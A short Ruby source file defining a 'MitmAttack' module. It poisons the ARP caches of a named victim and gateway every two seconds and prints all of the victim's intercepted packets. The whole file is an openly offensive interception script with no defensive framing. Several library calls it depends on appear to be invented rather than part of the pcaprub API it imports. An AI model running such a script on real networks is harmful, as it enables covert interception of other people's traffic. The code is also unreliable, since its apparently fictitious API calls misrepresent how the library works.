require 'pcaprub'

module MitmAttack
  def self.mitm_attack(interface, victim_ip, gateway_ip)
    capture = Pcap::Capture.open_live(interface, 65535, true, 0)

    arp_request_victim = Pcap::Packet.new
    arp_request_victim.add_arp_spoof(gateway_ip, victim_ip, Pcap::MAC.broadcast, Pcap::MAC.myself)

    arp_request_gateway = Pcap::Packet.new
    arp_request_gateway.add_arp_spoof(victim_ip, gateway_ip, Pcap::MAC.broadcast, Pcap::MAC.myself)

    Thread.new do
      loop do
        capture.sendpacket(arp_request_victim)
        capture.sendpacket(arp_request_gateway)
        sleep(2)
      end
    end

    puts "Starting packet capture..."
    capture.loop do |packet|

      if packet.ethernet? && (packet.ip_src == victim_ip || packet.ip_dst == victim_ip)
        puts "Captured packet: #{packet.inspect}"
      end
    end
  end
end
